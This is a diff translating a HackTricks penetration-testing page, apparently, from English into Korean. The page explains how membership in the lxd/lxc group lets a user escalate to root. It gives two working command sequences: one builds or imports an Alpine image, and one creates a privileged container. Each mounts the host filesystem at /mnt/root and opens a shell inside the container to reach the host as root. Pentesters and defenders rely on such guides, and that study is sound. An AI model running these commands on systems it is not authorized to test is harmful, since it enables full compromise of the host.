@@ -1,15 +1,14 @@
-# lxd/lxc Group - Privilege escalation
+# lxd/lxc 그룹 - 권한 상승
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+_**lxd**_ **또는** _**lxc**_ **그룹**에 속하면, 루트가 될 수 있습니다.**
 
-## Exploiting without internet
+## 인터넷 없이 악용하기
 
-### Method 1
+### 방법 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
+이 배포판 빌더를 당신의 머신에 설치할 수 있습니다: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(github의 지침을 따르세요):
 ```bash
 sudo su
 # Install requirements
@@ -34,9 +33,7 @@ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ## Using build-lxc
 sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-
-Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
-
+파일 **lxd.tar.xz**와 **rootfs.squashfs**를 업로드하고, 이미지를 레포지토리에 추가한 후 컨테이너를 생성합니다:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,23 +48,19 @@ lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and **repeat** the previous chunk of commands
+> 이 오류 _**Error: No storage pool found. Please create a new storage pool**_를 발견하면\
+> **`lxd init`**를 실행하고 **이전 명령어 조각을 반복**하세요.
 
-Finally you can execute the container and get root:
-
+마지막으로 컨테이너를 실행하고 root를 얻을 수 있습니다:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-
 ### Method 2
 
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+Alpine 이미지를 빌드하고 `security.privileged=true` 플래그를 사용하여 시작하여 컨테이너가 호스트 파일 시스템과 루트로 상호 작용하도록 강제합니다.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -87,5 +80,4 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
